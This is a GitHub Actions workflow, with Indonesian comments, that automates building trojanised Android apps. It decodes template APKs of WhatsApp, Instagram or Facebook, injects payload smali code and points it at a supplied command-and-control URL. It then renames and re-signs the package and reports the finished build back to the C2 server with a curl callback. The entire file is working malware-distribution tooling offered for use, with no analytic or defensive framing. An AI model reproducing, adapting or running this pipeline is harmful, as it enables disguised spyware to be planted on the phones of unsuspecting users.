name: Build APK

on:
  workflow_dispatch:
    inputs:
      build_id:
        description: 'Build ID'
        required: true
      app_name:
        description: 'Nama Aplikasi'
        required: true
      package_name:
        description: 'Nama Paket'
        required: true
      c2_url:
        description: 'URL Server C2'
        required: true
      bind_target:
        description: 'Target Binding'
        required: true
        default: 'whatsapp'
      permissions:
        description: 'Izin (JSON)'
        required: false
      icon_base64:
        description: 'Ikon (Base64)'
        required: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v5
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip

      - name: Download Apktool JAR
        run: |
          wget -O apktool.jar https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar
          sudo mv apktool.jar /usr/local/bin/apktool.jar

      - name: Download Uber APK Signer
        run: |
          wget -O uber-apk-signer.jar https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar

      - name: Prepare template APK (WAJIB LOKAL)
        run: |
          # 🔥 WAJIB: File template HARUS ada di folder templates/
          TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
          if [ ! -f "$TEMPLATE_FILE" ]; then
            echo "❌ ERROR: File template tidak ditemukan: $TEMPLATE_FILE"
            echo "📌 Silakan upload file APK ke folder templates/ dengan nama:"
            echo "   - templates/whatsapp.apk"
            echo "   - templates/instagram.apk"
            echo "   - templates/facebook.apk"
            exit 1
          fi
          echo "✅ Menggunakan template lokal: $TEMPLATE_FILE"
          cp "$TEMPLATE_FILE" template.apk
          # Verifikasi apakah file adalah APK valid
          if ! file template.apk | grep -q "Zip archive data"; then
            echo "❌ ERROR: File template bukan APK valid (bukan zip archive)."
            echo "📌 Pastikan file yang diupload adalah APK yang benar."
            exit 1
          fi
          echo "✅ Template APK valid."

      - name: Decode template APK
        run: java -jar /usr/local/bin/apktool.jar d template.apk -o decoded/

      - name: Inject payload and modify config
        run: |
          if [ -d "payload/smali" ]; then
            cp -r payload/smali/* decoded/smali/
          fi
          sed -i "s/<string name=\"app_name\">.*<\/string>/<string name=\"app_name\">${{ inputs.app_name }}<\/string>/g" decoded/res/values/strings.xml || true
          sed -i "s/package=\".*\"/package=\"${{ inputs.package_name }}\"/g" decoded/AndroidManifest.xml || true
          find decoded -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
          if [ -n "${{ inputs.icon_base64 }}" ]; then
            echo "${{ inputs.icon_base64 }}" | base64 -d > icon.png
            cp icon.png decoded/res/drawable/ic_launcher.png || true
          fi

      - name: Rebuild APK
        run: java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk

      - name: Sign APK
        run: |
          keytool -genkey -v -keystore debug.keystore -alias release -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown" -storepass android -keypass android
          jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android unsigned.apk release
          zipalign -v -p 4 unsigned.apk signed.apk 2>/dev/null || true

      - name: Upload APK as artifact
        uses: actions/upload-artifact@v4
        with:
          name: app-${{ inputs.build_id }}
          path: signed.apk

      - name: Update build status (success)
        run: |
          curl -X POST "${{ inputs.c2_url }}/api/build-callback" \
            -H "Content-Type: application/json" \
            -d "{\"build_id\":\"${{ inputs.build_id }}\",\"status\":\"success\",\"download_url\":\"https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts\"}"
